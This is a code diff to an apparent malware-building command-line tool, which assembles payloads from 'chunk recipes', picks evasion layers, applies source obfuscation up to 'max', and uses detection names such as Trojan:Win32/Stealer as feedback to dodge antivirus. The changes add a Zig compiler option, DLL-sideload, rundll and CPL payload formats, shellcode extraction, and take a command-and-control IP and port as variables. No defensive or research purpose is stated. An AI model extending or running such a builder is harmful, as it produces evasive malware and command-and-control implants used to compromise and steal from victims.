@@ -25,9 +25,14 @@ from pathlib import Path
 
 from .target_spec import OSPlatform, TargetEnvironmentSpec
 from .spec_parser import parse_target_spec
-from .pipeline import MalwarePipeline, PipelineResult
 from .config_models import VMProvisionConfig, TargetOS
 from .debug_logger import DebugLogger
+
+try:
+    from .pipeline import MalwarePipeline, PipelineResult
+    _HAS_PIPELINE = True
+except ImportError:
+    _HAS_PIPELINE = False
 
 _LOG_DIR = Path(__file__).parent / "logs"
 
@@ -64,6 +69,9 @@ def _setup_logging(verbose: bool = False) -> None:
 
 async def cmd_generate(args) -> int:
     """Generate malware source code from a target spec."""
+    if not _HAS_PIPELINE:
+        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
+        return 1
     debug = DebugLogger(enabled=getattr(args, "debug", False))
 
     # Early validation — malware_type must be explicitly set in spec.yaml
@@ -183,6 +191,9 @@ async def cmd_provision(args) -> int:
 
 async def cmd_verify(args) -> int:
     """Verify already-generated source against a provisioned VM."""
+    if not _HAS_PIPELINE:
+        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
+        return 1
     from .provision_engine import ProvisionEngine, QEMUProcess
     debug = DebugLogger(enabled=getattr(args, "debug", False))
 
@@ -272,6 +283,9 @@ async def cmd_verify(args) -> int:
 
 async def cmd_run(args) -> int:
     """Full pipeline: spec → generate → provision → verify → loop."""
+    if not _HAS_PIPELINE:
+        print("ERROR: LLM pipeline moved to out-of-order/. Use 'chunk' subcommand instead.")
+        return 1
     from .provision_engine import ProvisionEngine, QEMUProcess
     debug = DebugLogger(enabled=getattr(args, "debug", False))
 
@@ -444,7 +458,7 @@ async def cmd_chunk(args) -> int:
     """Assemble malware from chunk recipes (no LLM needed)."""
     import sys
     sys.path.insert(0, str(Path(__file__).parent / "templates" / "chunks"))
-    from templates.chunks.assembler import assemble, compile_mingw
+    from templates.chunks.assembler import assemble, compile_mingw, compile_zig
     from templates.chunks.evasion_selector import select_layers, config_to_recipe, format_selection_report, record_run
 
     recipe_dir = Path(__file__).parent / "templates" / "chunks" / "recipes"
@@ -542,17 +556,29 @@ async def cmd_chunk(args) -> int:
         with open(recipe_path) as _rf:
             _recipe_data = _yaml.safe_load(_rf)
         _arch = _recipe_data.get("arch", "")
-        if _arch == "arch/dll_sideload":
-            exe_out = pkg_dir / "payload.dll"
+        _compiler = getattr(args, "compiler", "mingw") or "mingw"
+        _compile_fn = compile_zig if _compiler == "zig" else compile_mingw
+        dll_archs = {"arch/dll_sideload", "arch/dll_rundll", "arch/dll_cpl"}
+        if _arch in dll_archs:
             _def_name = _recipe_data.get("def_file", "version.def")
             _def_path = str(Path(__file__).parent / "templates" / "chunks" / "arch" / _def_name)
-            ok = compile_mingw(str(src_out), str(exe_out), dll_def=_def_path)
+            if _arch == "arch/dll_cpl":
+                exe_out = pkg_dir / "payload.cpl"
+            else:
+                exe_out = pkg_dir / "payload.dll"
+            ok = _compile_fn(str(src_out), str(exe_out), dll_def=_def_path)
         else:
             exe_out = pkg_dir / "payload.exe"
-            ok = compile_mingw(str(src_out), str(exe_out))
+            ok = _compile_fn(str(src_out), str(exe_out))
         if not ok:
             return 1
         build_info += f"binary_size: {exe_out.stat().st_size}\n"
+
+    if getattr(args, "format", "exe") == "shellcode" and exe_out and exe_out.exists():
+        from templates.chunks.assembler import extract_shellcode
+        sc_out = pkg_dir / "payload.bin"
+        if extract_shellcode(str(exe_out), str(sc_out)):
+            build_info += f"shellcode_size: {sc_out.stat().st_size}\n"
 
     rc = 0
     c2_port = os.environ.get("C2_PORT", extra_vars.get("C2_PORT", "9001"))
@@ -866,12 +892,16 @@ def build_parser() -> argparse.ArgumentParser:
     chunk_parser.add_argument("--type", default=None, help="Malware type (auto-detected from recipe name if not set)")
     chunk_parser.add_argument("--detection", default="", help="Detection feedback for adaptive mode (e.g. 'Trojan:Win32/Stealer')")
     chunk_parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
+    chunk_parser.add_argument("--compiler", choices=["mingw", "zig"], default="mingw",
+                              help="Compiler toolchain (default: mingw)")
     chunk_parser.add_argument("--test", action="store_true", help="Deploy and test on VM (implies --compile)")
     chunk_parser.add_argument("--snapshot", action="store_true", help="Use VM snapshot before testing")
     chunk_parser.add_argument("-o", "--output", default="results", help="Output directory (default: results)")
     chunk_parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")
     chunk_parser.add_argument("--obfuscate", choices=["none", "light", "heavy", "max"],
                               default="none", help="Source-level obfuscation (default: none)")
+    chunk_parser.add_argument("--format", choices=["exe", "dll", "shellcode"], default="exe",
+                              help="Output format (default: exe)")
 
     # -- analyze ------------------------------------------------------------
     ana_parser = subparsers.add_parser("analyze", help="Query DBs and show context without generating code")
